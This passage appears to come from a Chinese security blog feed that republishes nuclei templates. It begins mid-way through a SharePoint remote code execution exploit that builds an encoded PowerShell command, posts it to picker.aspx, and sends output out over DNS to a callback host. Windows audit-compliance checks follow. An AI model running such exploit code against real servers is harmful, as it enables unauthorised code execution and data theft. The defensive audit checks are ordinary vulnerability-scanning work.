%(v_hex)s = &quot;&quot;;</span><br><span class="hljs-string">      Foreach ($i in $bytearray) &#123;</span><br><span class="hljs-string">        %(v_hex)s = %(v_hex)s + $i.ToString(&quot;X&quot;).PadLeft(2,&quot;0&quot;);</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">              &#x27;&#x27;&#x27;</span>.strip() % <span class="hljs-built_in">dict</span>(cmd=cmd, v_raw=__var_raw, v_hex=__var_hex)<br>              __code += __dns_code<br>              __code = base64.b64encode(__code.encode(<span class="hljs-string">&#x27;UTF-16LE&#x27;</span>)).decode()<br>              cmd = <span class="hljs-string">&#x27;powershell -ep bypass -enc %s&#x27;</span> % (__code)<br>              <span class="hljs-built_in">print</span>(cmd)<br>          <span class="hljs-keyword">if</span> ntlm:<br>              <span class="hljs-keyword">from</span> requests_ntlm <span class="hljs-keyword">import</span> HttpNtlmAuth<br>              _auth = HttpNtlmAuth(*auth.split(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-number">1</span>))<br>          <span class="hljs-keyword">else</span>:<br>              _auth = <span class="hljs-literal">None</span><br>          _headers = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>: default_ua&#125;<br>          req_kwargs = &#123;<br>              <span class="hljs-string">&#x27;headers&#x27;</span>: _headers,<br>              <span class="hljs-string">&#x27;auth&#x27;</span>: _auth,<br>              <span class="hljs-string">&#x27;verify&#x27;</span>: <span class="hljs-literal">False</span><br>          &#125;<br>          <span class="hljs-keyword">def</span> <span class="hljs-title function_">auto_sp_attack</span>(<span class="hljs-params">kwargs</span>):<br>              <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> paths:<br>                  url = os.getenv(<span class="hljs-string">&#x27;RootURL&#x27;</span>) + item<br>                  <span class="hljs-comment"># get sharepoint version (2019,2016 / 2013 / 2010)</span><br>                  res = requests.get(url, **kwargs)<br>                  spversion = res.headers.get(<span class="hljs-string">&#x27;MicrosoftSharePointTeamServices&#x27;</span>, <span class="hljs-string">&#x27;16&#x27;</span>).split(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.0.0.0&#x27;</span><br>                  kwargs[<span class="hljs-string">&#x27;params&#x27;</span>] = <span class="hljs-built_in">dict</span>(PickerDialogType=<span class="hljs-string">&#x27;Microsoft.SharePoint.WebControls.ItemPickerDialog,Microsoft.SharePoint,Version=%s,Culture=neutral,PublicKeyToken=71e9bce111e9429c&#x27;</span> % spversion)<br>                  <span class="hljs-comment"># get viewstate &amp; ev from picker.aspx</span><br>                  <span class="hljs-keyword">if</span> res.status_code != <span class="hljs-number">200</span>:<br>                      <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s failed [%s]&#x27;</span> % (item, res.status_code))<br>                      <span class="hljs-keyword">continue</span><br>                  <span class="hljs-keyword">else</span>:<br>                      <span class="hljs-keyword">break</span><br>              rt = lxml.html.fromstring(res.content)<br>              spandata = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-keyword">lambda</span> x: x.get(<span class="hljs-string">&#x27;name&#x27;</span>).endswith(<span class="hljs-string">&#x27;hiddenSpanData&#x27;</span>), rt.xpath(<span class="hljs-string">&#x27;//input[contains(@name, &quot;hiddenSpanData&quot;)]&#x27;</span>)))[<span class="hljs-number">0</span>].get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>              kwargs[<span class="hljs-string">&#x27;data&#x27;</span>] = &#123;<br>                  <span class="hljs-string">&#x27;__VIEWSTATE&#x27;</span>: rt.get_element_by_id(<span class="hljs-string">&#x27;__VIEWSTATE&#x27;</span>).value <span class="hljs-keyword">if</span> rt.xpath(<span class="hljs-string">&#x27;//input[@id=&quot;__VIEWSTATE&quot;]&#x27;</span>) <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>                  <span class="hljs-string">&#x27;__EVENTVALIDATION&#x27;</span>: rt.get_element_by_id(<span class="hljs-string">&#x27;__EVENTVALIDATION&#x27;</span>).value <span class="hljs-keyword">if</span> rt.xpath(<span class="hljs-string">&#x27;//input[@id=&quot;__EVENTVALIDATION&quot;]&#x27;</span>) <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span>,<br>              &#125;<br>              payload = _0604(cmd)<br>              kwargs[<span class="hljs-string">&#x27;data&#x27;</span>][spandata] = payload<br>              <span class="hljs-keyword">return</span> requests.post(url, **kwargs)<br>          attack_fn = auto_sp_attack<br>          res = attack_fn(deepcopy(req_kwargs))<br>          <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(s <span class="hljs-keyword">in</span> res.text <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;&quot;ms-pickerresultheadertr&quot;&#x27;</span>, <span class="hljs-string">&#x27;Administrators, see the server log for more information.&#x27;</span>]):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%s succeded (%s)&#x27;</span> % (res.url, res.status_code))<br>      <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>          main()<br><br>    matchers:<br>      - <span class="hljs-built_in">type</span>: dsl<br>        dsl:<br>          - <span class="hljs-string">&#x27;contains(interactsh_protocol, &quot;dns&quot;)&#x27;</span><br>          - <span class="hljs-string">&#x27;contains(interactsh_request, hex_encode(marker))&#x27;</span><br>        condition: <span class="hljs-keyword">and</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Microsoft SharePoint 远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;&lt;s</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="远程代码执行" scheme="http://example.com/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Windows Server 可逆加密存储密码漏洞</title>
    <link href="http://example.com/2025/06/26/github_2912032414/"/>
    <id>http://example.com/2025/06/26/github_2912032414/</id>
    <published>2025-06-26T11:18:29.041Z</published>
    <updated>2025-06-26T11:18:29.037Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Windows Server 可逆加密存储密码漏洞</p><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 确保“使用可逆加密存储密码”策略设置为禁用。如果启用，它可能允许以明文形式检索存储的密码，构成严重的安全风险。如果此设置启用，攻击者可能恢复用户密码，导致未经授权的访问和网络资源的泄露。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> Windows Server</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fpassword-cleartext-encryption.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fpassword-cleartext-encryption.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> password-cleartext-encryption<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Store Passwords Using Reversible Encryption Check<br>  <span class="hljs-params">author:</span> nukunga[SungHyunJeon]<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    Ensure the <span class="hljs-string">&quot;Store passwords using reversible encryption&quot;</span> policy is set to Disabled. If enabled, it can allow stored passwords to be retrieved <span class="hljs-keyword">in</span> plaintext, posing a serious security risk.<br>  <span class="hljs-params">impact:</span> |<br>    If this setting is enabled, attackers could potentially recover user passwords, leading to unauthorized access and compromise of network resources.<br>  <span class="hljs-params">remediation:</span> |<br>    Disable this policy using one of the following <span class="hljs-params">methods:</span><br>    <span class="hljs-operator">-</span> Command <span class="hljs-params">Line:</span> Export the security configuration, set ClearTextPassword<span class="hljs-operator">=</span><span class="hljs-number">0</span>, and reapply it using secedit.<br>    <span class="hljs-operator">-</span> <span class="hljs-params">GUI:</span> Open Local Security Policy → Account Policies → Password Policy → <span class="hljs-string">&quot;Store passwords using reversible encryption&quot;</span> and set it to Disabled.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>isms.kisa.<span class="hljs-keyword">or</span>.kr<span class="hljs-operator">/</span>main<span class="hljs-operator">/</span>csap<span class="hljs-operator">/</span>notice<span class="hljs-operator">/</span><span class="hljs-operator">?</span>boardId<span class="hljs-operator">=</span>bbs_0000000000000004&amp;mode<span class="hljs-operator">=</span>view&amp;cntId<span class="hljs-operator">=</span><span class="hljs-number">85</span><br>  <span class="hljs-params">tags:</span> code,windows-audit,kisa,account-management,password-policy<br><br><span class="hljs-params">self-contained:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">pre-condition:</span> |<br>      IsWindows();<br>    <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> powershell<br>      <span class="hljs-operator">-</span> powershell.exe<br>    <span class="hljs-params">args:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-operator">-</span>ExecutionPolicy<br>      <span class="hljs-operator">-</span> Bypass<br>    <span class="hljs-params">pattern:</span> <span class="hljs-string">&quot;*.ps1&quot;</span><br>    <span class="hljs-params">source:</span> |<br>      <span class="hljs-comment"># Export security settings to a configuration file</span><br>      secedit <span class="hljs-symbol">/export</span> <span class="hljs-symbol">/cfg</span> C:\cfg.txt | Out-Null<br>      $cfg <span class="hljs-operator">=</span> Get-Content C:\cfg.txt | Out-String<br>      <span class="hljs-keyword">if</span> ($cfg <span class="hljs-operator">-</span>match <span class="hljs-string">&quot;ClearTextPassword<span class="hljs-char escape_">\s</span>*=<span class="hljs-char escape_">\s</span>*(<span class="hljs-char escape_">\d</span>)&quot;</span>) &#123;<br>          $value <span class="hljs-operator">=</span> $Matches[<span class="hljs-number">1</span>]<br>          <span class="hljs-keyword">if</span> ($value <span class="hljs-operator">-</span>eq <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>              <span class="hljs-string">&quot;CLEAR_TEXT_PASSWORD_ENABLED&quot;</span><br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>              <span class="hljs-string">&quot;CLEAR_TEXT_PASSWORD_DISABLED&quot;</span><br>          &#125;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-string">&quot;CLEAR_TEXT_PASSWORD_NOT_FOUND&quot;</span><br>      &#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;CLEAR_TEXT_PASSWORD_ENABLED&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Windows Server 可逆加密存储密码漏洞&lt;/p&gt;
&lt;p&gt;&lt;stron</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>RDS Removal Check</title>
    <link href="http://example.com/2025/06/26/github_3876170482/"/>
    <id>http://example.com/2025/06/26/github_3876170482/</id>
    <published>2025-06-26T11:18:17.168Z</published>
    <updated>2025-06-26T11:18:17.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> RDS Removal Check</p><p><strong>漏洞类型：</strong> 配置问题</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 确保远程数据服务（RDS）被移除或未配置，以减少拒绝服务攻击或远程执行管理命令的风险。如果满足以下任一条件，则符合合规性：未安装或未使用IIS，默认网站不包含&#x2F;msadc虚拟目录，或与RDS相关的ADCLaunch注册表键不存在。不当配置的RDS可能被攻击者利用来执行远程代码或发起拒绝服务攻击。</p><p><strong>产品名称：</strong> IIS</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Frds-removal-check.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Frds-removal-check.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> rds-removal-check<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> RDS Removal Check<br>  <span class="hljs-params">author:</span> nukunga[SungHyunJeon]<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    Ensure that Remote Data Services (RDS) are either removed <span class="hljs-keyword">or</span> not configured to reduce the risk of denial-of-service attacks <span class="hljs-keyword">or</span> remote execution of administrative commands.<br>    Compliance is met <span class="hljs-keyword">if</span> any of the following conditions are <span class="hljs-params">true:</span><br>    <span class="hljs-operator">-</span> IIS is not installed <span class="hljs-keyword">or</span> <span class="hljs-keyword">in</span> use,<br>    <span class="hljs-operator">-</span> The default website does not include the <span class="hljs-symbol">/msadc</span> virtual directory, <span class="hljs-keyword">or</span><br>    <span class="hljs-operator">-</span> The relevant ADCLaunch registry keys associated <span class="hljs-keyword">with</span> RDS are not present.<br>  <span class="hljs-params">impact:</span> |<br>    Improperly configured RDS can be exploited by attackers to execute remote code <span class="hljs-keyword">or</span> launch denial-of-service attacks.<br>  <span class="hljs-params">remediation:</span> |<br>    To mitigate RDS-related risks, take the following <span class="hljs-params">actions:</span><br>      <span class="hljs-operator">-</span> Remove the <span class="hljs-symbol">/msadc</span> virtual directory from the default website.<br>      <span class="hljs-operator">-</span> Delete these registry <span class="hljs-params">keys:</span><br>        <span class="hljs-operator">-</span> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\ADCLaunch\RDSServer.DataFactory<br>        <span class="hljs-operator">-</span> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\ADCLaunch\AdvancedDataFactory<br>        <span class="hljs-operator">-</span> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\ADCLaunch\VbBusObj.VbBusObjCls<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>isms.kisa.<span class="hljs-keyword">or</span>.kr<span class="hljs-operator">/</span>main<span class="hljs-operator">/</span>csap<span class="hljs-operator">/</span>notice<span class="hljs-operator">/</span><span class="hljs-operator">?</span>boardId<span class="hljs-operator">=</span>bbs_0000000000000004&amp;mode<span class="hljs-operator">=</span>view&amp;cntId<span class="hljs-operator">=</span><span class="hljs-number">85</span><br>  <span class="hljs-params">tags:</span> rds,code,windows-audit,kisa<br><br><span class="hljs-params">self-contained:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">pre-condition:</span> |<br>      IsWindows();<br><br>    <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> powershell<br>      <span class="hljs-operator">-</span> powershell.exe<br><br>    <span class="hljs-params">args:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-operator">-</span>ExecutionPolicy<br>      <span class="hljs-operator">-</span> Bypass<br><br>    <span class="hljs-params">pattern:</span> <span class="hljs-string">&quot;*.ps1&quot;</span><br><br>    <span class="hljs-params">source:</span> |<br>      <span class="hljs-comment"># Check if IIS (W3SVC) service is present; if not, IIS is not used and RDS is implicitly compliant.</span><br>      $iisService <span class="hljs-operator">=</span> Get-Service <span class="hljs-operator">-</span>Name W3SVC <span class="hljs-operator">-</span>ErrorAction SilentlyContinue<br>      <span class="hljs-keyword">if</span> (-not $iisService) &#123;<br>          Write-Output <span class="hljs-string">&quot;RDS_COMPLIANT&quot;</span><br>          exit<br>      &#125;<br>      <span class="hljs-comment"># Check for the existence of the /msadc virtual directory in the Default Web Site.</span><br>      $msadcExists <span class="hljs-operator">=</span> $<span class="hljs-literal">false</span><br>      try &#123;<br>          Import-Module WebAdministration <span class="hljs-operator">-</span>ErrorAction SilentlyContinue<br>          $vdirs <span class="hljs-operator">=</span> Get-WebVirtualDirectory <span class="hljs-operator">-</span>Site <span class="hljs-string">&quot;Default Web Site&quot;</span> <span class="hljs-operator">-</span>ErrorAction SilentlyContinue<br>          <span class="hljs-keyword">if</span> ($vdirs) &#123;<br>              foreach ($vdir <span class="hljs-keyword">in</span> $vdirs) &#123;<br>                  <span class="hljs-keyword">if</span> ($vdir.Path <span class="hljs-operator">-</span>eq <span class="hljs-string">&quot;/msadc&quot;</span>) &#123;<br>                      $msadcExists <span class="hljs-operator">=</span> $<span class="hljs-literal">true</span><br>                      break<br>                  &#125;<br>              &#125;<br>          &#125;<br>      &#125; catch &#123;&#125;<br>      <span class="hljs-comment"># Check for ADCLaunch registry keys related to RDS.</span><br>      $adcLaunchPath <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HKLM:<span class="hljs-char escape_">\S</span>YSTEM<span class="hljs-char escape_">\C</span>urrentControlSet<span class="hljs-char escape_">\S</span>ervices<span class="hljs-char escape_">\W</span>3SVC<span class="hljs-char escape_">\P</span>arameters<span class="hljs-char escape_">\A</span>DCLaunch&quot;</span><br>      $rdServerExists <span class="hljs-operator">=</span> Test-Path <span class="hljs-string">&quot;$adcLaunchPath<span class="hljs-char escape_">\R</span>DSServer.DataFactory&quot;</span><br>      $advDataExists <span class="hljs-operator">=</span> Test-Path <span class="hljs-string">&quot;$adcLaunchPath<span class="hljs-char escape_">\A</span>dvancedDataFactory&quot;</span><br>      $vbBusObjExists <span class="hljs-operator">=</span> Test-Path <span class="hljs-string">&quot;$adcLaunchPath<span class="hljs-char escape_">\V</span>bBusObj.VbBusObjCls&quot;</span><br>      <span class="hljs-comment"># Compliance is achieved if the /msadc virtual directory does not exist OR none of the registry keys exist.</span><br>      <span class="hljs-keyword">if</span> ((-not $msadcExists) <span class="hljs-operator">-</span><span class="hljs-keyword">or</span> (-not ($rdServerExists <span class="hljs-operator">-</span><span class="hljs-keyword">or</span> $advDataExists <span class="hljs-operator">-</span><span class="hljs-keyword">or</span> $vbBusObjExists))) &#123;<br>          Write-Output <span class="hljs-string">&quot;RDS_COMPLIANT&quot;</span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          Write-Output <span class="hljs-string">&quot;RDS_VULNERABLE&quot;</span><br>      &#125;<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;RDS_VULNERABLE&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; RDS Removal Check&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
    
    <category term="配置问题" scheme="http://example.com/tags/%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>Windows Server Shutdown on Audit Failure Vulnerability</title>
    <link href="http://example.com/2025/06/26/github_3900911015/"/>
    <id>http://example.com/2025/06/26/github_3900911015/</id>
    <published>2025-06-26T11:17:58.594Z</published>
    <updated>2025-06-26T11:17:58.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Windows Server Shutdown on Audit Failure Vulnerability</p><p><strong>漏洞类型：</strong> 配置问题</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 确保禁用“Shutdown on Audit Failure”策略。注册表值应设置为“4,0”，以防止系统在无法记录安全审计事件时关闭。如果设置为“4,1”，系统将在审计失败时关闭，这可能导致拒绝服务情况。启用此策略（值设置为“4,1”）可能会导致系统在无法写入审计日志时意外关闭，可能中断服务并导致数据丢失的风险。</p><p><strong>产品厂商：</strong> Microsoft</p><p><strong>产品名称：</strong> Windows Server</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fcrash-on-audit-fail.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/b740ee6791c0a6d36cac233d23a096ba91d2f060/code%2Fwindows%2Faudit%2Fkisa%2Fcrash-on-audit-fail.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> crash-on-audit-fail<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Shutdown on Audit Failure Check<br>  <span class="hljs-params">author:</span> nukunga[SungHyunJeon]<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    Ensure the <span class="hljs-string">&quot;Shutdown on Audit Failure&quot;</span> policy is disabled.<br>    The registry value should be set to <span class="hljs-string">&quot;4,0&quot;</span> to prevent the system from shutting down <span class="hljs-keyword">if</span> it cannot log security audit events.<br>    If set to <span class="hljs-string">&quot;4,1&quot;</span>, the system will shut down on audit failure, which could result <span class="hljs-keyword">in</span> a denial-of-service condition.<br>  <span class="hljs-params">impact:</span> |<br>    Enabling this policy (value set to <span class="hljs-string">&quot;4,1&quot;</span>) may cause the system to shut down unexpectedly <span class="hljs-keyword">if</span> audit logs cannot be written, potentially disrupting services and risking data loss.<br>  <span class="hljs-params">remediation:</span> |<br>    Disable the policy by setting the CrashOnAuditFail value to <span class="hljs-string">&quot;4,0&quot;</span>. This can be done <span class="hljs-params">by:</span><br>    <span class="hljs-operator">-</span> Using the Registry <span class="hljs-params">Editor:</span> Navigate to HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System and set CrashOnAuditFail to <span class="hljs-string">&quot;4,0&quot;</span>.<br>    <span class="hljs-operator">-</span> Through Local Security <span class="hljs-params">Policy:</span> Set <span class="hljs-string">&quot;Audit: Shut down system immediately if unable to log security audits&quot;</span> to Disabled.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>isms.kisa.<span class="hljs-keyword">or</span>.kr<span class="hljs-operator">/</span>main<span class="hljs-operator">/</span>csap<span class="hljs-operator">/</span>notice<span class="hljs-operator">/</span><span class="hljs-operator">?</span>boardId<span class="hljs-operator">=</span>bbs_0000000000000004&amp;mode<span class="hljs-operator">=</span>view&amp;cntId<span class="hljs-operator">=</span><span class="hljs-number">85</span><br>  <span class="hljs-params">tags:</span> account-management,code,windows-audit,kisa,policy<br><br><span class="hljs-params">self-contained:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-params">code:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">pre-condition:</span> |<br>      IsWindows();<br>    <span class="hljs-params">engine:</span><br>      <span class="hljs-operator">-</span> powershell<br>      <span class="hljs-operator">-</span> powershell.exe<br>    <span class="hljs-params">args:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-operator">-</span>ExecutionPolicy<br>      <span class="hljs-operator">-</span> Bypass<br>    <span class="hljs-params">pattern:</span> <span class="hljs-string">&quot;*.ps1&quot;</span><br>    <span class="hljs-params">source:</span> 